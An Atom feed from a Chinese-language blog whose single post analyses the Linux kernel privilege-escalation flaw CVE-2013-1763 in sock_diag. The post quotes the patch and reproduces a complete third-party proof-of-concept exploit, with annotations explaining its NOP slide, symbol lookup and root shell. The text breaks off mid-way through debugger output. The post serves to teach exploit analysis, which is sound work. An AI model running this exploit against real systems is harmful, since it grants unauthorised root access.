<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Frank&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://fengguoqing.github.io/"/>
  <updated>2017-11-26T01:53:26.167Z</updated>
  <id>https://fengguoqing.github.io/</id>
  
  <author>
    <name>Frank Feng</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析</title>
    <link href="https://fengguoqing.github.io/2016/09/04/linux-kernel-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9ECVE-2013-1763-exploit-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>https://fengguoqing.github.io/2016/09/04/linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析/</id>
    <published>2016-09-04T12:52:20.000Z</published>
    <updated>2017-11-26T01:53:26.167Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析"><a href="#linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析" class="headerlink" title="linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析"></a>linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析</h1><p>kernel 最近出了一个新的本地提权安全漏洞CVE-2013-1763，影响范围比较广泛，ubuntu，Arch，fedora都受到其影响，漏洞刚公布就有牛人发布了利用该漏洞获取root权限的攻击代码，下面会分析该代码是如何获取root权限的。</p><p>首先对CVE-2013-1763这个安全漏洞简单介绍一下。</p><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述"></a>1. 漏洞描述</h2><p>在<code>net/core/sock_diag.c</code>中，<code>__sock_diag_rcv_msg</code>函数未对<code>sock_diag_handlers</code>数组传入的下标做边界检查，导致可能越界，进而导致可执行代码的漏洞。没有root权限的用户可以利用该漏洞获取到root权限。</p><h2 id="2-漏洞的影响范围"><a href="#2-漏洞的影响范围" class="headerlink" title="2. 漏洞的影响范围"></a>2. 漏洞的影响范围</h2><p><strong>linux kernel 3.0-3.7.10</strong></p><h2 id="3-漏洞曝光时间"><a href="#3-漏洞曝光时间" class="headerlink" title="3. 漏洞曝光时间"></a>3. 漏洞曝光时间</h2><p><strong>2013/02/19</strong></p><h2 id="4-漏洞产生的原因"><a href="#4-漏洞产生的原因" class="headerlink" title="4. 漏洞产生的原因"></a>4. 漏洞产生的原因</h2><p>首先看一下这个漏洞的patch：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">net/core/sock_diag.c View file @ <span class="number">6e601</span>a5</span><br><span class="line">@@ <span class="number">-121</span>,<span class="number">6</span> +<span class="number">121</span>,<span class="number">9</span> @@ <span class="keyword">static</span> <span class="keyword">int</span> __sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)</span><br><span class="line">   <span class="keyword">if</span> (nlmsg_len(nlh) &lt; <span class="keyword">sizeof</span>(*req))</span><br><span class="line">     <span class="keyword">return</span> -EINVAL;</span><br><span class="line"> </span><br><span class="line">+  <span class="keyword">if</span> (req-&gt;sdiag_family &gt;= AF_MAX)</span><br><span class="line">+    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">+</span><br><span class="line">   hndl = sock_diag_lock_handler(req-&gt;sdiag_family);</span><br><span class="line">   <span class="keyword">if</span> (hndl == <span class="literal">NULL</span>)</span><br><span class="line">     err = -ENOENT;</span><br></pre></td></tr></table></figure></p><p>Patch 很简单，只是加上了数组边界判断而已。那么在看看<code>sock_diag_lock_hander</code>这个函数做了些什么：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">inline</span> struct sock_diag_handler *<span class="title">sock_diag_lock_handler</span><span class="params">(<span class="keyword">int</span> family)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (sock_diag_handlers[family] == <span class="literal">NULL</span>)</span><br><span class="line">                request_module(<span class="string">"net-pf-%d-proto-%d-type-%d"</span>, PF_NETLINK,</span><br><span class="line">                                NETLINK_SOCK_DIAG, family);</span><br><span class="line"></span><br><span class="line">        mutex_lock(&amp;sock_diag_table_mutex);</span><br><span class="line">        <span class="keyword">return</span> sock_diag_handlers[family];<span class="comment">//这个函数没有对传入的family的值的范围,进行验证,从而造成数组越界.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个函数也没有做什么，只是对 <code>sock_diag_lock_hander[family]</code>进行检测，是否为NULL，如果为NULL申请注册，然后加上了一把锁，最后返回的是它的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">sock_diag_handler</span> *<span class="title">sock_diag_handlers</span>[<span class="title">AF_MAX</span>];</span>  <span class="comment">//可以看出,这个指针数组最大为AF_MAX AF_MAX = 40.</span></span><br></pre></td></tr></table></figure><p>接着我们再看看完整的<code>__sock_diag_rcv_msg</code>函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> err;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_diag_req</span> *<span class="title">req</span> = <span class="title">NLMSG_DATA</span>(<span class="title">nlh</span>);</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_diag_handler</span> *<span class="title">hndl</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nlmsg_len(nlh) &lt; <span class="keyword">sizeof</span>(*req))</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    hndl = sock_diag_lock_handler(req-&gt;sdiag_family);<span class="comment">//这里传入sdiag_family的值,然后返回数组指针sock_diag_handlers[reg-&gt;sdiag_family].由于没有做边界判断，那么就可以越界。</span></span><br><span class="line">    <span class="keyword">if</span> (hndl == <span class="literal">NULL</span>)</span><br><span class="line">        err = -ENOENT;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        err = hndl-&gt;dump(skb, nlh); <span class="comment">//看到这里是不是很激动呢，利用这里可以让它执行我们自己的代码</span></span><br><span class="line">    sock_diag_unlock_handler(hndl);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="5-漏洞的利用"><a href="#5-漏洞的利用" class="headerlink" title="5. 漏洞的利用"></a>5. 漏洞的利用</h2><p>虽然已经找到了kernel中有这样一个漏洞，但是如何利用这个漏洞来执行我们自己的程序，取得root权限还是需要很困难的，需要对kernel系统以及计算机运行原理非常了解才可以，并且这些程序往往需要精细设计才能达到最终的目的。 下面是某牛人写的exploit代码，请欣赏：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">* quick'n'dirty poc for CVE-2013-1763 SOCK_DIAG bug in kernel 3.3-3.8</span></span><br><span class="line"><span class="comment">* bug found by Spender</span></span><br><span class="line"><span class="comment">* poc by SynQ</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* hard-coded for 3.5.0-17-generic #28-Ubuntu SMP Tue Oct 9 19:32:08 UTC 2012 i686 i686 i686 GNU/Linux</span></span><br><span class="line"><span class="comment">* using nl_table-&gt;hash.rehash_time, index 81</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* Fedora 18 support added</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* 2/2013</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sock_diag.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/inet_diag.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unix_diag.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>))) (* _commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line">_commit_creds commit_creds;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sock_diag_handlers, nl_table;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>)))    <span class="comment">//这是指示GCC编译器选用3个寄存器代替堆栈来传递参数。</span></span><br><span class="line">kernel_code()</span><br><span class="line">&#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(<span class="number">0</span>));  <span class="comment">//这行代码执行之后就可以获取root权限，但是这两个函数都是内核函数，必须在内核态执行才有效。</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这段函数没有使用，用来解释hard code jump[] 为什么是那些数值</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">jump_payload_not_used</span><span class="params">(<span class="keyword">void</span> *skb, <span class="keyword">void</span> *nlh)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"mov $kernel_code, %eax\n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"call *%eax\n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">  )</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span></span><br><span class="line">get_symbol(<span class="keyword">char</span> *name)  <span class="comment">//为了获取内核函数地址</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *f;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> addr;</span><br><span class="line">  <span class="keyword">char</span> dummy, sym[<span class="number">512</span>];</span><br><span class="line">  <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  f = fopen(<span class="string">"/proc/kallsyms"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> (!f) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">while</span> (ret != EOF) &#123;</span><br><span class="line">    ret = <span class="built_in">fscanf</span>(f, <span class="string">"%p %c %s\n"</span>, (<span class="keyword">void</span> **) &amp;addr, &amp;dummy, sym);</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">fscanf</span>(f, <span class="string">"%s\n"</span>, sym);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, sym)) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[+] resolved symbol %s to %p\n"</span>, name, (<span class="keyword">void</span> *) addr);</span><br><span class="line">      fclose(f);</span><br><span class="line">      <span class="keyword">return</span> addr;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(f);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>*argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">unsigned</span> family;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> <span class="title">nlh</span>;</span>  <span class="comment">//socket协议netlink数据包的格式</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">unix_diag_req</span> <span class="title">r</span>;</span></span><br><span class="line">  &#125; req;</span><br><span class="line">  <span class="keyword">char</span>  buf[<span class="number">8192</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建一个netlink协议的socket，因为__sock_diag_rcv_msg函数是属于NETLINK_SOCK_DIAG的</span></span><br><span class="line">  <span class="keyword">if</span> ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Can't create sock diag socket\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//填充数据包，就是为了最终能够执行到__sock_diag_rcv_msg中去</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">  req.nlh.nlmsg_len = <span class="keyword">sizeof</span>(req);</span><br><span class="line">  req.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;</span><br><span class="line">  req.nlh.nlmsg_flags = NLM_F_ROOT|NLM_F_MATCH|NLM_F_REQUEST;</span><br><span class="line">  req.nlh.nlmsg_seq = <span class="number">123456</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//req.r.sdiag_family = 89;</span></span><br><span class="line">  req.r.udiag_states = <span class="number">-1</span>;</span><br><span class="line">  req.r.udiag_show = UDIAG_SHOW_NAME | UDIAG_SHOW_PEER | UDIAG_SHOW_RQLEN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argc==<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Run: %s Fedora|Ubuntu\n"</span>,argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="number">1</span>],<span class="string">"Fedora"</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">    commit_creds = (_commit_creds) get_symbol(<span class="string">"commit_creds"</span>);</span><br><span class="line">    prepare_kernel_cred = (_prepare_kernel_cred) get_symbol(<span class="string">"prepare_kernel_cred"</span>);</span><br><span class="line">    sock_diag_handlers = get_symbol(<span class="string">"sock_diag_handlers"</span>);</span><br><span class="line">    nl_table = get_symbol(<span class="string">"nl_table"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!prepare_kernel_cred || !commit_creds || !sock_diag_handlers || !nl_table)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"some symbols are not available!\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    family = (nl_table - sock_diag_handlers) / <span class="number">4</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"family=%d\n"</span>,family);</span><br><span class="line">    req.r.sdiag_family = family;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(family&gt;<span class="number">255</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"nl_table is too far!\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="number">1</span>],<span class="string">"Ubuntu"</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">    commit_creds = (_commit_creds) <span class="number">0xc106bc60</span>;</span><br><span class="line">    prepare_kernel_cred = (_prepare_kernel_cred) <span class="number">0xc106bea0</span>;</span><br><span class="line">    req.r.sdiag_family = <span class="number">81</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> mmap_start, mmap_size;</span><br><span class="line">  mmap_start = <span class="number">0x10000</span>;  <span class="comment">//选择了一块1MB多的内存区域</span></span><br><span class="line">  mmap_size = <span class="number">0x120000</span>;  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"mmapping at 0x%lx, size = 0x%lx\n"</span>, mmap_start, mmap_size);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (mmap((<span class="keyword">void</span>*)mmap_start, mmap_size, PROT_READ|PROT_WRITE|PROT_EXEC,</span><br><span class="line">                MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>) == MAP_FAILED) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"mmap fault\n"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span>*)mmap_start, <span class="number">0x90</span>, mmap_size);         <span class="comment">//将其全部填充为0x90，在X86系统中对应的是NOP指令</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> jump[] = <span class="string">"\x55\x89\xe5\xb8\x11\x11\x11\x11\xff\xd0\x5d\xc3"</span>; <span class="comment">// jump_payload in asm</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> *asd = &amp;jump[<span class="number">4</span>];</span><br><span class="line">  *asd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)kernel_code; <span class="comment">//使用kernel_code函数的地址替换掉jump[]中的0x11</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//将jump这段代码放在mmap内存区域的最后，也就是说只要最后能够跳转到这块区域，就可以执行到jump代码，进而跳转执行kernel_code，因为这块区域中布满了NOP指令。</span></span><br><span class="line">  <span class="built_in">memcpy</span>( (<span class="keyword">void</span>*)mmap_start+mmap_size-<span class="keyword">sizeof</span>(jump), jump, <span class="keyword">sizeof</span>(jump));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//所有准备工作完成之后，最后在这里发送socket触发这个漏洞</span></span><br><span class="line">  <span class="keyword">if</span> ( send(fd, &amp;req, <span class="keyword">sizeof</span>(req), <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"bad send\n"</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"uid=%d, euid=%d\n"</span>,getuid(), geteuid() );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!getuid())</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="6-exploit代码分析"><a href="#6-exploit代码分析" class="headerlink" title="6. exploit代码分析"></a>6. exploit代码分析</h2><p>在分析之前，有些概念要澄清一下，在linux系统中，用户空间和内核空间是独立存在的。在一个32位的linux系统中，每个进程会虚拟出4G的内存空间，其中3G是用户空间，1G是内核空间，用户空间的地址范围是0&times;00000000 到 0xBFFFFFFF，内核空间的地址是0xC0000000 到 0xFFFFFFFF。内核地址空间由所有进程共享，但只有运行在内核态的进程才能访问，用户进程可以通过系统调用切换到内核态访问内核空间，进程运行在内核态时所产生的地址都属于内核空间。<code>commit_creds</code>和<code>prepare_kernel_cred</code>均为内核函数，如果要执行他们就应该切换到内核状态运行。当执行内核函数<code>__sock_diag_rcv_msg</code>是处于内核态的，所以这个时候调用执行kernel_code函数就可以取得root权限。</p><p>那么如何调用kernel_code函数呢？所有我们mmap了一块从0x10000开始0x120000大小的内存空间，然后将这块空间写满NOP指令，将跳转执行kernel_code的代码放在这块区域的最后面，也就是说，只要跳转执行到这块内存区域的（除了jump代码块内部）都会顺利跑到kernel_code函数。这种方法叫做<strong>NOP slide</strong>，就像坐滑滑梯一样，自然滑到底部。jump这一段代码的分析如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> jump[] = <span class="string">"\x55\x89\xe5\xb8\x11\x11\x11\x11\xff\xd0\x5d\xc3"</span>; <span class="comment">// jump_payload in asm</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> *asd = &amp;jump[<span class="number">4</span>];</span><br><span class="line">  *asd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)kernel_code;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">jump_payload_not_used</span><span class="params">(<span class="keyword">void</span> *skb, <span class="keyword">void</span> *nlh)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"mov $kernel_code, %eax\n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"call *%eax\n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">  )</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fengguoqing@VirtualBox:~/Downloads$ gcc CVE<span class="number">-2013</span><span class="number">-1763.</span>c</span><br><span class="line">CVE<span class="number">-2013</span><span class="number">-1763.</span>c: In function ‘main’:</span><br><span class="line">CVE<span class="number">-2013</span><span class="number">-1763.</span>c:<span class="number">148</span>:<span class="number">26</span>: warning: initialization from incompatible pointer type [enabled by <span class="keyword">default</span>]</span><br><span class="line">fengguoqing@VirtualBox:~/Downloads$ objdump -D a.out</span><br><span class="line">….</span><br><span class="line"><span class="number">08048763</span> &lt;jump_payload_not_used&gt;:</span><br><span class="line"> <span class="number">8048763</span>:  <span class="number">55</span>                     push   %ebp</span><br><span class="line"> <span class="number">8048764</span>:  <span class="number">89</span> e5                  mov    %esp,%ebp</span><br><span class="line"> <span class="number">8048766</span>:  b8 <span class="number">3</span>c <span class="number">87</span> <span class="number">04</span> <span class="number">08</span>         mov    $<span class="number">0x804873c</span>,%eax</span><br><span class="line"> <span class="number">804876b</span>:  ff d0                  call   *%eax</span><br><span class="line"> <span class="number">804876</span>d:  <span class="number">5</span>d                     pop    %ebp</span><br><span class="line"> <span class="number">804876</span>e:  c3                     ret   </span><br><span class="line">….</span><br><span class="line"></span><br><span class="line">(gdb) p/x jump</span><br><span class="line">$<span class="number">2</span> = &#123;<span 